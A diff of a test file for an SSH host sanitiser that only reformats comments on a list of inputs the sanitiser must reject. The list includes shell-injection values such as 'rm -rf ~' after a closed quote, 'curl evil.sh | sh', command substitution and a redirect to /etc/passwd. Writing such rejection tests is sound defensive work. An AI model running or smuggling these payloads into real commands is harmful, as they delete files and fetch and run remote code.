@@ -35,16 +35,16 @@ describe("sanitizeSshHost", () => {
   // what it reads as — the exact failure the allowlist exists to prevent.
   test("rejects anything that could end the argument or chain a command", () => {
     for (const bad of [
-      'nose" ; rm -rf ~',       // close the outer quote, then a new command
-      "nose'",                   // close the inner pane quote
+      'nose" ; rm -rf ~', // close the outer quote, then a new command
+      "nose'", // close the inner pane quote
       "nose; curl evil.sh | sh", // command separator
-      "nose && whoami",          // conditional chain
-      "nose | tee /tmp/x",       // pipe
-      "nose $(whoami)",          // command substitution
-      "nose `whoami`",           // legacy substitution
-      "nose\nrm -rf ~",          // newline = a second command line
-      "nose > /etc/passwd",      // redirect
-      "a b",                     // a bare space splits argv
+      "nose && whoami", // conditional chain
+      "nose | tee /tmp/x", // pipe
+      "nose $(whoami)", // command substitution
+      "nose `whoami`", // legacy substitution
+      "nose\nrm -rf ~", // newline = a second command line
+      "nose > /etc/passwd", // redirect
+      "a b", // a bare space splits argv
       "nose#comment",
       "nose\\",
     ]) {
